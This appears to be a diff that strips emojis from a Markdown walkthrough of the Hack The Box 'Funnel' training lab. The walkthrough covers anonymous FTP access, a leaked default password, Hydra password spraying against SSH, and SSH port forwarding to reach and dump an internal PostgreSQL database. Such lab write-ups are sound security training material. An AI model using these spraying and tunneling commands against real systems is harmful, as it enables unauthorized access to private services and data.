@@ -1,21 +1,21 @@
-# 🧪 Hack The Box - Funnel Walkthrough  
+# Hack The Box - Funnel Walkthrough  
 **Module**: Tunneling / Port Forwarding  
 **Author(s)**: amra, C4rm3l0  
 **Focus**: SSH Tunneling, PostgreSQL Enumeration, FTP Enumeration, Password Spraying  
 **Difficulty**: Intermediate  
 ---
 
-## 🧠 Introduction - What Is Tunneling?
+## Introduction - What Is Tunneling?
 
 In secure environments, services like **databases**, **Redis**, or **internal dev apps** are **only exposed on internal interfaces (localhost)**. That means: even if you scan from the outside, you won’t see them. But if an attacker gets access to a system inside the network, **they can access those "hidden" services via SSH tunnels**.
 
-### 💡 What Is a Tunnel?
+### What Is a Tunnel?
 
 - **Tunneling** = Encapsulating one protocol inside another, to get through restricted networks.
 - In SSH, tunneling allows us to **forward ports** through the encrypted SSH session.
 - That means we can use **local tools** to interact with **remote services** that aren't normally reachable.
 
-### 🔒 Types of SSH Tunneling
+### Types of SSH Tunneling
 
 | Type               | Description                                                                 |
 |--------------------|-----------------------------------------------------------------------------|
@@ -25,15 +25,15 @@ In secure environments, services like **databases**, **Redis**, or **internal de
 
 ---
 
-## 🔍 Reconnaissance with Nmap
+## Reconnaissance with Nmap
 
 ```bash
 nmap -sV -sC 10.129.X.X
 ```
 
-### 🔎 Results:
+### Results:
 
-```
+```text
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 3.0.3
 22/tcp open  ssh     OpenSSH 8.x
@@ -43,9 +43,9 @@ FTP is potentially open for anonymous access. SSH is up and may be bruteforceabl
 
 ---
 
-## 📁 FTP Enumeration - Gaining Initial Intel
+## FTP Enumeration - Gaining Initial Intel
 
-### 👇 Connect to FTP Anonymously:
+### Connect to FTP Anonymously:
 
 ```bash
 ftp 10.129.X.X
@@ -53,12 +53,12 @@ Name: anonymous
 Password: [just press Enter]
 ```
 
-✅ Response: `230 Login successful`  
-Boom! We're in.
+ Response: `230 Login successful`  
+Authentication succeeded.
 
 ---
 
-### 🗂️ Explore the Directories
+### Explore the Directories
 
 ```bash
 dir          # list files
@@ -66,14 +66,14 @@ cd mail_backup
 dir          # list contents inside
 ```
 
-🧾 Files Discovered:
+ Files Discovered:
 
 - `welcome_28112022`
 - `password_policy.pdf`
 
 ---
 
-### ⬇️ Download the Files
+### Download the Files
 
 ```bash
 get welcome_28112022
@@ -83,28 +83,28 @@ exit
 
 ---
 
-### 📖 Review Downloaded Files
+### Review Downloaded Files
 
 ```bash
 cat welcome_28112022
 ```
 
 - Reveals email content.
-- 🧠 **Extract usernames** from email list (e.g., `alice@funnel.htb` → `alice`)
+-  **Extract usernames** from email list (e.g., `alice@funnel.htb` → `alice`)
 
-📄 View the PDF:
+ View the PDF:
 - Use GUI viewer or open file manager:
 ```bash
 open .
 ```
 
-🧠 It reveals default password: `funnel123#!#`
+ It reveals default password: `funnel123#!#`
 
 ---
 
-## 🔑 SSH Brute-force (Password Spraying) with Hydra
+## SSH Brute-force (Password Spraying) with Hydra
 
-💥 Let's attempt **password spraying** on SSH using:
+ Let's attempt **password spraying** on SSH using:
 
 - A list of usernames (`usernames.txt`)
 - The known password `funnel123#!#`
@@ -113,22 +113,22 @@ open .
 hydra -L usernames.txt -p 'funnel123#!#' ssh://10.129.X.X
 ```
 
-✅ Found credentials:  
+ Found credentials:  
 **christine : funnel123#!#**
 
 ---
 
-## 🐚 SSH Login - Gaining Foothold
+## SSH Login - Gaining Foothold
 
 ```bash
 ssh christine@10.129.X.X
 ```
 
-🧠 We're in as user `christine`.
+Authenticated as **`christine`**.
 
 ---
 
-## 🛠️ Local Port Enumeration with `ss`
+## Local Port Enumeration with `ss`
 
 Now we enumerate **internal services** that weren't exposed to Nmap.
 
@@ -144,13 +144,13 @@ Explanation:
 | -l   | Only listening sockets     |
 | -n   | Don’t resolve port names   |
 
-### 📍 Found:
+### Found:
 
 - `127.0.0.1:5432` → Postgres running **locally only** — not accessible remotely
 
 ---
 
-## 🧠 Problem: No `psql` on Target
+## Problem: No `psql` on Target
 
 Running:
 
@@ -158,15 +158,15 @@ Running:
 psql
 ```
 
-❌ Not found.
+ Not found.
 
-🧠 We can’t interact with Postgres *on the remote machine*. But we **can** use SSH tunneling to bring the service to our own machine.
+ We can’t interact with Postgres *on the remote machine*. But we **can** use SSH tunneling to bring the service to our own machine.
 
 ---
 
-## 🔄 Local Port Forwarding - Accessing Postgres via Tunnel
+## Local Port Forwarding - Accessing Postgres via Tunnel
 
-### 🔁 Create SSH Tunnel:
+### Create SSH Tunnel:
 
 ```bash
 ssh -L 1234:localhost:5432 christine@10.129.X.X
@@ -179,11 +179,11 @@ Explanation:
 - `localhost:5432`: destination on remote server (Postgres)
 - `christine@...`: SSH user and host
 
-✅ Now, port `1234` on our local machine is connected to `5432` on the target.
+ Now, port `1234` on our local machine is connected to `5432` on the target.
 
 ---
 
-## 🧰 Install `psql` Locally
+## Install `psql` Locally
 
 ```bash
 sudo apt update && sudo apt install postgresql-client
@@ -191,22 +191,22 @@ sudo apt update && sudo apt install postgresql-client
 
 ---
 
-## 🧑‍💻 Connect to Remote Postgres via Tunnel
+## Connect to Remote Postgres via Tunnel
 
 ```bash
 psql -U christine -h localhost -p 1234
 ```
 
-🧠 PostgreSQL prompts for password. Try:  
+ PostgreSQL prompts for password. Try:  
 `funnel123#!#`
 
-✅ Connected!
+ Connected!
 
 ---
 
-## 🧬 PostgreSQL Enumeration
+## PostgreSQL Enumeration
 
-### 📜 List Databases
+### List Databases
 
 ```sql
 \l
@@ -215,13 +215,13 @@ psql -U christine -h localhost -p 1234
 Found:  
 - `secrets`
 
-### 🔄 Connect to the `secrets` DB
+### Connect to the `secrets` DB
 
 ```sql
 \c secrets
 ```
 
-### 📂 List Tables
+### List Tables
 
 ```sql
 \dt
@@ -230,19 +230,19 @@ Found:
 Found:  
 - `flag`
 
-### 📥 Dump Flag Table
+### Dump Flag Table
 
 ```sql
 SELECT * FROM flag;
 ```
 
-🎯 **Flag Acquired!** Mission accomplished!
+ **Flag Acquired!** Mission accomplished!
 
 ---
 
-## ⚙️ [Optional] Dynamic Port Forwarding (SOCKS5 Proxy)
+## [Optional] Dynamic Port Forwarding (SOCKS5 Proxy)
 
-### 🔁 Start Tunnel:
+### Start Tunnel:
 
 ```bash
 ssh -D 1234 christine@10.129.X.X
@@ -250,13 +250,13 @@ ssh -D 1234 christine@10.129.X.X
 
 - `-D 1234`: start SOCKS proxy on local port 1234
 
-🧠 Now our local port 1234 acts as a SOCKS5 proxy — all traffic sent through it gets forwarded through the SSH session!
+ Now our local port 1234 acts as a SOCKS5 proxy — all traffic sent through it gets forwarded through the SSH session!
 
 ---
 
-## 🔗 Use `proxychains` with SOCKS Tunnel
+## Use `proxychains` with SOCKS Tunnel
 
-### 🔧 Configure `/etc/proxychains4.conf`
+### Configure `/etc/proxychains4.conf`
 
 ```ini
 strict_chain
@@ -267,36 +267,36 @@ strict_chain
 socks5 127.0.0.1 1234
 ```
 
-### 📡 Run Commands Through the Proxy
+### Run Commands Through the Proxy
 
 ```bash
 proxychains psql -U christine -h localhost -p 5432
 ```
 
-🎯 Success — you can now tunnel **any traffic** (cURL, nmap, browsers) via the SOCKS proxy.
+ Success — you can now tunnel **any traffic** (cURL, nmap, browsers) via the SOCKS proxy.
 
 ---
 
-## 🏁 Summary
+## Summary
 
 | Step | Action                                                   |
 |------|----------------------------------------------------------|
-| 1️⃣   | Scanned target and found FTP + SSH                      |
-| 2️⃣   | Logged in anonymously to FTP                            |
-| 3️⃣   | Extracted usernames + default password from files       |
-| 4️⃣   | Used Hydra to password spray SSH                        |
-| 5️⃣   | Logged in as `christine`                                |
-| 6️⃣   | Discovered Postgres on `localhost:5432`                 |
-| 7️⃣   | Forwarded port via SSH: `-L 1234:localhost:5432`        |
-| 8️⃣   | Connected to Postgres from local machine using `psql`   |
-| 9️⃣   | Enumerated databases → dumped the flag table            |
+|    | Scanned target and found FTP + SSH                      |
+|    | Logged in anonymously to FTP                            |
+|    | Extracted usernames + default password from files       |
+|    | Used Hydra to password spray SSH                        |
+|    | Logged in as `christine`                                |
+|    | Discovered Postgres on `localhost:5432`                 |
+|    | Forwarded port via SSH: `-L 1234:localhost:5432`        |
+|    | Connected to Postgres from local machine using `psql`   |
+|    | Enumerated databases → dumped the flag table            |
 
 ---
 
-✅ **Lessons Learned**:
+ **Lessons Learned**:
 
 - Tunneling is a powerful way to reach internal services
 - SSH tunnels are secure, encrypted, and versatile
 - Even restricted environments can leak sensitive data if one foothold is gained
 
-🔥 Stay stealthy. Stay sharp. Tunnel your way to root.
+ Stay stealthy. Stay sharp. Tunnel your way to root.
